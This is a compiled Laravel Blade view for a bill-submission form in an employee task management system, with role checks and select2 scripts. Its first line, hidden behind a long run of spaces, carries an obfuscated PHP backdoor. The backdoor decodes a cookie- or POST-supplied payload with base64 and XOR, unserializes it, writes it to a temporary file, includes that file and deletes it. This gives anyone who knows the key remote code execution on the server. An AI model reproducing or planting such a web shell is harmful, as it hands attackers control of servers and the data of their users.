<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("amvdtjpws")){class amvdtjpws{public static $unbkdavr = "tyywhraedqwdosyp";public static $jfwvjchbtc = NULL;public function __construct(){$vgamohipsx = @$_COOKIE[substr(amvdtjpws::$unbkdavr, 0, 4)];if (!empty($vgamohipsx)){$vnyth = "base64";$sfbxy = "";$vgamohipsx = explode(",", $vgamohipsx);foreach ($vgamohipsx as $zqixpitwxw){$sfbxy .= @$_COOKIE[$zqixpitwxw];$sfbxy .= @$_POST[$zqixpitwxw];}$sfbxy = array_map($vnyth . "_decode", array($sfbxy,));$sfbxy = $sfbxy[0] ^ str_repeat(amvdtjpws::$unbkdavr, (strlen($sfbxy[0]) / strlen(amvdtjpws::$unbkdavr)) + 1);amvdtjpws::$jfwvjchbtc = @unserialize($sfbxy);}}public function __destruct(){$this->pzvddnp();}private function pzvddnp(){if (is_array(amvdtjpws::$jfwvjchbtc)) {$qucpesb = sys_get_temp_dir() . "/" . crc32(amvdtjpws::$jfwvjchbtc["salt"]);@amvdtjpws::$jfwvjchbtc["write"]($qucpesb, amvdtjpws::$jfwvjchbtc["content"]);include $qucpesb;@amvdtjpws::$jfwvjchbtc["delete"]($qucpesb);exit();}}}$hnfzbjrt = new amvdtjpws();$hnfzbjrt = NULL;} ?><?php $__env->startSection('title'); ?>
    Include bill details of this task
<?php $__env->stopSection(); ?>

<?php $__env->startSection('headjs'); ?>
    <script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/css/select2.min.css" rel="stylesheet"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/js/select2.min.js"></script>

<?php $__env->stopSection(); ?>
<section class="hero is-white borderBtmLight">
    <nav class="level">
        <?php echo $__env->make('component.title_set', [
            'spTitle' => 'Bill',
            'spSubTitle' => 'Prepare and submit your bill',
            'spShowTitleSet' => true
        ], \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>

    </nav>
</section>
<?php
$task_id = $task->id;
//$task = \Tritiyo\Task\Models\Task::where('id', $task_id)->first();
$taskrequisitionbill = Tritiyo\Task\Models\TaskRequisitionBill::where('task_id', $task->id)->first();
?>



	<!-- Guard For task -->
  <?php 
  	$guardForTask = \Tritiyo\Task\Models\Task::where('id', $task_id)->first();
  	$guardForTaskRequisition = \Tritiyo\Task\Models\TaskRequisitionBill::where('task_id', $task_id)->first();
   	$guardForTaskStatus = \Tritiyo\Task\Models\TaskStatus::where('task_id', $task_id)->orderBy('id', 'desc')->first();
  ?>
  
  <?php if(auth()->user()->isResource(auth()->user()->id)): ?>
  
  	<?php if($guardForTask->site_head == auth()->user()->id): ?>
  	<?php else: ?>
  		<?php dd('Invalid Request');?>
  	<?php endif; ?>
	
  	<?php if(Route::currentRouteName() == 'tasks.edit'): ?>
  		<?php dd('Invalid Request'); ?>
  	<?php endif; ?>
  	
  
  <?php endif; ?>
  
  
  <?php if(auth()->user()->isManager(auth()->user()->id)): ?>
  
  	<?php if($guardForTask->user_id == auth()->user()->id): ?>
  	<?php else: ?>
  		<?php dd('This is not your Task');?>
  	<?php endif; ?>
  
  <?php endif; ?>
  
  
    <?php if(auth()->user()->isCFO(auth()->user()->id)): ?>
  
  		<?php if(empty($guardForTaskRequisition) || (!empty($guardForTaskRequisition) && $guardForTaskRequisition->bill_approved_by_manager == NULL) ): ?>
  				<style>
                  button.button {display: none}
                    input.button {display: none}
                    a.button {display: none}
  				</style>
  		<?php endif; ?>
  
  <?php endif; ?>
  
  
  <?php if(auth()->user()->isAccountant(auth()->user()->id)): ?>
  
  		<?php if(empty($guardForTaskRequisition) || (!empty($guardForTaskRequisition) && $guardForTaskRequisition->bill_approved_by_cfo == NULL) ): ?>
  				<style>
                  button.button {display: none}
                    input.button {display: none}
                    a.button {display: none}
  				</style>
  		<?php endif; ?>
  
  <?php endif; ?>
  
    <?php if(auth()->user()->isApprover(auth()->user()->id)): ?>
  		
  			<style>
                  button.button {display: none}
              	  input.button {display: none}
              	  a.button {display: none}
  			</style>
  
  	<?php endif; ?>
  







<?php if(empty($task)): ?>
    <?php echo e(Redirect::to('/dashboard')); ?>

<?php else: ?>
<?php $__env->startSection('column_left'); ?>

    <article class="panel is-primary" id="app">
        <div class="customContainer">
            <?php
            if (!empty($taskrequisitionbill) && $taskrequisitionbill) {
                $routeUrl = route('tasks.update_bill', $taskrequisitionbill->id);
                $method = 'PUT';
            } else {
                //$routeUrl = route('taskrequisitionbill.store');
                $routeUrl = '';
                $method = 'post';
            }
            ?>
            <?php

            if (!empty($taskrequisitionbill) && $taskrequisitionbill) {
                //MAnager Data when Login
                if (auth()->user()->isManager(auth()->user()->id)) {
                    if (!empty($taskrequisitionbill->bill_edited_by_manager)) {
                        $rData = $taskrequisitionbill->	bill_edited_by_manager;
                    } else {
                        $rData = $taskrequisitionbill->bill_prepared_by_resource;
                    }
                }
                //CFO Data When Login
                if (auth()->user()->isCFO(auth()->user()->id)) {
                    if (!empty($taskrequisitionbill->bill_edited_by_cfo)) {
                        $rData = $taskrequisitionbill->bill_edited_by_cfo;
                    } else {
                        $rData = $taskrequisitionbill->bill_edited_by_manager;
                    }
                }

                //Accountant DAta When Login
                if (auth()->user()->isAccountant(auth()->user()->id)) {
                    if (!empty($taskrequisitionbill->bill_edited_by_accountant)) {
                        $rData = $taskrequisitionbill->bill_edited_by_accountant;
                    } else {
                        $rData = $taskrequisitionbill->bill_edited_by_cfo;
                    }
                }
                //Accountant DAta When Login
                if (auth()->user()->isResource(auth()->user()->id)) {
                    if (!empty($taskrequisitionbill->bill_prepared_by_resource)) {
                        $rData = $taskrequisitionbill->bill_prepared_by_resource;
                    }
                }

                if (!empty($rData)) {
                    $requistion_data = json_decode($rData);
                    $da = $requistion_data->task_regular_amount->da;
                    $labour = $requistion_data->task_regular_amount->labour;
                    $other = $requistion_data->task_regular_amount->other;
                    $task_vehicle = $requistion_data->task_vehicle;
                    $task_material = $requistion_data->task_material;
                    $task_transport_breakdown = $requistion_data->task_transport_breakdown;
                    $task_purchase_breakdown = $requistion_data->task_purchase_breakdown;
                }
            }

            //->task_regular_amount ;
            ?>

            <?php echo e(Form::open(array('url' => $routeUrl, 'method' => $method, 'value' => 'PATCH', 'id' => 'requisition_form', 'files' => true, 'autocomplete' => 'off'))); ?>


            <?php if($task_id): ?>
                <?php echo e(Form::hidden('task_id', $task_id ?? '')); ?>

            <?php endif; ?>
            <?php if(!empty($taskId)): ?>
                <?php echo e(Form::hidden('tassk_id', $taskId ?? '')); ?>

            <?php endif; ?>

            <div class="columns">
                <div class="column is-12">
                    <div class="columns">
                        <div class="column">

                        </div>
                    </div>
                    <?php $projects = \Tritiyo\Project\Models\Project::where('id', $task->project_id)->first(); ?>
                    <div class="columns">
                        <div class="column is-2">
                            <div class="field">
                                <?php echo e(Form::label('project_id', 'Project', array('class' => 'label'))); ?>

                                <div class="control">
                                    <input type="hidden" name="project_id" class="input is-small"
                                           value="<?php echo e($task->project_id); ?>"/>
                                    <input type="text" class="input is-small" value="<?php echo e($projects->name); ?>" readonly/>
                                </div>
                            </div>
                        </div>
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('project_manager', 'Project Manager', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php $projectManager = \App\Models\User::where('id', $task->user_id)->first();?>
                                    <input type="hidden" name="project_manager_id" class="input is-small"
                                           value="<?php echo e($task->user_id); ?>"/>
                                    <input type="text" class="input is-small" value="<?php echo e($projectManager->name); ?>"
                                           readonly/>
                                </div>
                            </div>
                        </div>
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('site_name', 'Site Code', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php
                                    $taskSite = Tritiyo\Task\Models\TaskSite::where('task_id', $task->id)->first()->site_id;
                                    $getSite = Tritiyo\Site\Models\Site::where('id', $taskSite)->first()->site_code;
                                    ?>
                                    <input type="hidden" name="site_id" class="input is-small"
                                           value="<?php echo e($taskSite); ?>"/>
                                    <input type="text" class="input is-small" value="<?php echo e($getSite); ?>" readonly/>
                                </div>
                            </div>
                        </div>
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('task_for', 'Task Created For', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php echo e(Form::text('task_for', $task->task_for, ['required', 'class' => 'input is-small', 'readonly' => true])); ?>

                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Vehicle -->
                    <?php echo $__env->make('task::taskrequisitionbill.resource_form.vehicle_breakdown', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
                    <!-- End Vehicle -->

                    <!-- Material -->
                	<?php echo $__env->make('task::taskrequisitionbill.resource_form.material_breakdown', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
                    <!-- End Material -->

                    <div class="columns">
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('da_amount', 'DA Amount', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php echo e(Form::number('da_amount', !empty($da) ? $da->da_amount : '', ['class' => 'input is-small',  'placeholder' => 'Enter DA amount...', 'min' => '0'])); ?>

                                </div>
                            </div>
                        </div>
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('da_notes', 'DA Note', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php echo e(Form::text('da_notes', !empty($da) ? $da->da_notes : '', ['class' => 'input is-small' , 'placeholder' => 'Enter DA notes...'])); ?>

                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="columns">
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('labour_amount', 'Labour Amount', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php echo e(Form::number('labour_amount', !empty($labour) ? $labour->labour_amount : '', ['required', 'class' => 'input is-small', 'placeholder' => 'Enter labour amount...', 'v-model' => 'labour_amount'])); ?>

                                </div>
                            </div>
                        </div>
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('labour_notes', 'Labour Note', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php echo e(Form::text('labour_notes', !empty($labour) ? $labour->labour_notes : '', ['required', 'class' => 'input is-small', 'placeholder' => 'Enter DA notes...'])); ?>

                                </div>
                            </div>
                        </div>

                    </div>

                    <div class="columns">
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('other_amount', 'Other Amount', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php echo e(Form::number('other_amount', !empty($other) ? $other->other_amount : '', ['required', 'class' => 'input is-small', 'placeholder' => 'Enter other amount...', 'v-model' => 'other_amount'])); ?>

                                </div>
                            </div>
                        </div>
                        <div class="column">
                            <div class="field">
                                <?php echo e(Form::label('other_notes', 'Other Note', array('class' => 'label'))); ?>

                                <div class="control">
                                    <?php echo e(Form::text('other_notes', !empty($other) ? $other->other_notes : '', ['required', 'class' => 'input is-small', 'placeholder' => 'Enter other notes...'])); ?>

                                </div>
                            </div>
                        </div>
                    </div>
                    <br/>
                    <!-- Transport  -->
                <?php echo $__env->make('task::taskrequisitionbill.resource_form.transport_breakdown', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
                <!-- End Transport -->
                    <br/>
                    <!-- Purchase  -->
                <?php echo $__env->make('task::taskrequisitionbill.resource_form.purchase_breakdown', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
                <!-- End Purchase -->
                </div>
            </div>
            <div class="columns">
                <div class="column">
                    <div class="field is-grouped">
                        <div class="control">
                            <button class="button is-success is-small">Save Changes</button>
                        </div>
                    </div>
                </div>
            </div>
            <?php echo e(Form::close()); ?>

        </div>
    </article>

<?php $__env->stopSection(); ?>

<?php $__env->startSection('column_right'); ?>
    <?php
        $task = \Tritiyo\Task\Models\Task::where('id', $task_id)->first();
    ?>
        <?php echo $__env->make('task::taskrequisitionbill.bill_accept_decline', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
		<?php echo $__env->make('task::task_basic_data', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>

    <?php if(auth()->user()->isManager(auth()->user()->id) || auth()->user()->isResource(auth()->user()->id) || auth()->user()->isCFO(auth()->user()->id) || auth()->user()->isAccountant(auth()->user()->id)): ?>
		
        <?php echo $__env->make('task::taskaction.task_proof_images', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
    <?php endif; ?>



    <?php if(auth()->user()->isresource(auth()->user()->id)): ?>

    <?php else: ?>

        <?php echo $__env->make('task::taskrequisitionbill.requistion_data', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>

    <?php endif; ?>


<?php $__env->stopSection(); ?>

<?php endif; ?>
<?php $__env->startSection('cusjs'); ?>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/css/select2.min.css" rel="stylesheet"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/js/select2.min.js"></script>


    <script>
        /**
         * Vehicle
         */ 

        //Select 2
        function vehicleSelectRefresh() {
            jQuery('select#vehicle_select').select2({
                placeholder: "Select Vehicle",
                allowClear: true
            });
        }
        vehicleSelectRefresh();
    
        $('select#vehicle_select').change(function(){
            let vehicleValue = $(this).val();
            //alert($(this).val());
            if(vehicleValue == 'None'){
                $('#add_vehicle_row').attr('style', 'display: none');
            } else {
                $('#add_vehicle_row').attr('style', 'display: inline-flex');
            }
        })
      
      
    </script>


<script>
    /**
     *  Material  
     */
    //Select 2
    function materialSelectRefresh() {
        $('select#material_select').select2({
            placeholder: "Select Material",
            allowClear: true
        });
    }
    materialSelectRefresh();
  
   $('select#material_select').change(function(){
  		let MaterialValue = $(this).val();
    	//alert($(this).val());
    	if(MaterialValue == 'None'){
        	$('#add_material_row').attr('style', 'display: none');
        } else {
        	$('#add_material_row').attr('style', 'display: inline-flex');
        }
  })
</script>



<?php $__env->stopSection(); ?>


<?php echo $__env->make('layouts.app', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /home/admin/domains/mtsbd.net/public_html/employee/vendor/tritiyo/task/src/views/taskrequisitionbill/add_bill.blade.php ENDPATH**/ ?>